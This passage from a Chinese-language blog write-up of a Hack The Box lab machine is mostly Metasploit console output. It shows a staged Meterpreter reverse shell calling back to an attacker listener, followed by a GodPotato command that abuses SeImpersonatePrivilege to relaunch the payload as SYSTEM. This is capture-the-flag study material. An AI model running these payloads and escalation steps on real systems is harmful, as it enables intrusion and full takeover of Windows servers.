+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> https://10.10.16.23:4444 handling request from 10.129.234.66; <span style="color:#f92672">(</span>UUID: ronoammx<span style="color:#f92672">)</span> Staging x64 payload <span style="color:#f92672">(</span><span style="color:#ae81ff">204892</span> bytes<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> https://10.10.16.23:4444 handling request from 10.129.234.66; <span style="color:#f92672">(</span>UUID: ronoammx<span style="color:#f92672">)</span> Without a database connected that payload UUID tracking will not work!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session ID <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>10.10.16.23:4444 -&gt; 10.129.234.66:58076<span style="color:#f92672">)</span> processing AutoRunScript <span style="color:#e6db74">&#39;post/windows/manage/migrate&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running module against DC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current server process: shell.exe <span style="color:#f92672">(</span>3968<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Spawning notepad.exe process to migrate into
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Spoofing PPID <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating into <span style="color:#ae81ff">5208</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully migrated into process <span style="color:#ae81ff">5208</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.16.23:4444 -&gt; 10.129.234.66:58076<span style="color:#f92672">)</span> at 2025-09-18 09:26:51 -0400
+</span></span><span style="display:flex;"><span>sessions -i <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 1...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">768</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.4052<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>qlsvc<span style="color:#ae81ff">\D</span>ocuments&gt;whoami /all
+</span></span><span style="display:flex;"><span>whoami /all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER INFORMATION
+</span></span><span style="display:flex;"><span>----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User Name     SID                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============</span> <span style="color:#f92672">============================================</span>
+</span></span><span style="display:flex;"><span>sendai<span style="color:#ae81ff">\s</span>qlsvc S-1-5-21-3085872742-570972823-736764132-1104
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>GROUP INFORMATION
+</span></span><span style="display:flex;"><span>-----------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Group Name                                 Type             SID                                                             Attributes                                        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==========================================</span> <span style="color:#f92672">================</span> <span style="color:#f92672">===============================================================</span> <span style="color:#f92672">==================================================</span>
+</span></span><span style="display:flex;"><span>Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\U</span>sers                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\P</span>re-Windows <span style="color:#ae81ff">2000</span> Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>BUILTIN<span style="color:#ae81ff">\C</span>ertificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\S</span>ERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT AUTHORITY<span style="color:#ae81ff">\T</span>his Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>NT SERVICE<span style="color:#ae81ff">\M</span>SSQL$SQLEXPRESS                Well-known group S-1-5-80-3880006512-4290199581-1648723128-3569869737-3631323133 Enabled by default, Enabled group, Group owner    
+</span></span><span style="display:flex;"><span>LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
+</span></span><span style="display:flex;"><span>Mandatory Label<span style="color:#ae81ff">\H</span>igh Mandatory Level       Label            S-1-16-12288                                                                                                      
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Privilege Name                Description                               State   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
+</span></span><span style="display:flex;"><span>SeMachineAccountPrivilege     Add workstations to domain                Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span></span><span style="display:flex;"><span>SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled 
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER CLAIMS INFORMATION
+</span></span><span style="display:flex;"><span>-----------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User claims unknown.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Kerberos support <span style="color:#66d9ef">for</span> Dynamic Access Control on this device has been disabled.
+</span></span></code></pre></div><p>随便找个土豆提权，搞定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>qlsvc<span style="color:#ae81ff">\D</span>ocuments&gt;.<span style="color:#ae81ff">\G</span>odPotato-NET4.exe  -cmd <span style="color:#e6db74">&#34;cmd /c C:\users\sqlsvc\Documents\shell.exe&#34;</span>
+</span></span><span style="display:flex;"><span>.<span style="color:#ae81ff">\G</span>odPotato-NET4.exe  -cmd <span style="color:#e6db74">&#34;cmd /c C:\users\sqlsvc\Documents\shell.exe&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CombaseModule: 0x140712362377216
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DispatchTable: 0x140712364964168
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UseProtseqFunction: 0x140712364257472
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UseProtseqFunctionParamCount: <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> HookRPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Start PipeServer
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trigger RPCSS
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CreateNamedPipe <span style="color:#ae81ff">\\</span>.<span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\e</span>e30b0eb-3444-427c-a150-41c7a1bf125d<span style="color:#ae81ff">\p</span>ipe<span style="color:#ae81ff">\e</span>pmapper
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj IPID: 00002002-0660-ffff-b35f-eef0a3c42949
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj OXID: 0x535f01d97b4a2461
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj OID: 0xeb87aa8a01016c28
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj Flags: 0x281
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DCOM obj PublicRefs: 0x0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Marshal Object bytes len: <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UnMarshal Object
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Pipe Connected!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CurrentUser: NT AUTHORITY<span style="color:#ae81ff">\N</span>ETWORK SERVICE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CurrentsImpersonationLevel: Impersonation
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Start Search System Token
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> PID : <span style="color:#ae81ff">924</span> Token:0x760  User: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM ImpersonationLevel: Impersonation
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Find System Token : True
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> UnmarshalObject: 0x80070776
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CurrentUser: NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> process start with pid <span style="color:#ae81ff">5628</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> https://10.10.16.23:4444 handling request from 10.129.234.66; <span style="color:#f92672">(</span>UUID: ronoammx<span style="color:#f92672">)</span> Without a database connected that payload UUID tracking will not work!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> https://10.10.16.23:4444 handling request from 10.129.234.66; <span style="color:#f92672">(</span>UUID: ronoammx<span style="color:#f92672">)</span> Staging x64 payload <span style="color:#f92672">(</span><span style="color:#ae81ff">204892</span> bytes<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> https://10.10.16.23:4444 handling request from 10.129.234.66; <span style="color:#f92672">(</span>UUID: ronoammx<span style="color:#f92672">)</span> Without a database connected that payload UUID tracking will not work!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Session ID <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>10.10.16.23:4444 -&gt; 10.129.234.66:58176<span style="color:#f92672">)</span> processing AutoRunScript <span style="color:#e6db74">&#39;post/windows/manage/migrate&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running module against DC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current server process: shell.exe <span style="color:#f92672">(</span>1896<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Spawning notepad.exe process to migrate into
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Spoofing PPID <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Migrating into <span style="color:#ae81ff">2504</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>qlsvc<span style="color:#ae81ff">\D</span>ocuments&gt;<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Successfully migrated into process <span style="color:#ae81ff">2504</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">2</span> opened <span style="color:#f92672">(</span>10.10.16.23:4444 -&gt; 10.129.234.66:58176<span style="color:#f92672">)</span> at 2025-09-18 09:32:55 -0400
+</span></span><span style="display:flex;"><span>exity^H
+</span></span><span style="display:flex;"><span>exity
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;exit&#39;</span> is not recognized as an internal or external command,
+</span></span><span style="display:flex;"><span>operable program or batch file.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>qlsvc<span style="color:#ae81ff">\D</span>ocuments&gt;exit
+</span></span><span style="display:flex;"><span>exit
+</span></span><span style="display:flex;"><span>meterpreter &gt; exit
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Shutting down session: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.234.66 - Meterpreter session <span style="color:#ae81ff">1</span> closed.  Reason: User exit
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/handler<span style="color:#f92672">)</span> &gt; sessions -i <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting interaction with 2...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; shell
+</span></span><span style="display:flex;"><span>Process <span style="color:#ae81ff">2564</span> created.
+</span></span><span style="display:flex;"><span>Channel <span style="color:#ae81ff">1</span> created.
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.4052<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\s</span>qlsvc<span style="color:#ae81ff">\D</span>ocuments&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>flag就在管理员目录，懒得放过来了</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a>
+        
+            <a href="/tags/htb/">Htb</a>
+        
+            <a href="/tags/%E5%9F%9F%E4%B9%8B%E9%AD%94%E6%B3%95/">域之魔法</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/scepter/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">scepter-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/sweep-htb/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">sweep-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/bicher-%E8%87%AA%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bicker-wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/adcsmake/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">ca管理员权限解析及利用发布恶意模板攻击</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/aircrack/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">aircrack-ng套件</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 wackymaker
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.9feb0937132291db314540e31350de0da717928ca87e53cdebf73f0dfcdc569c.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
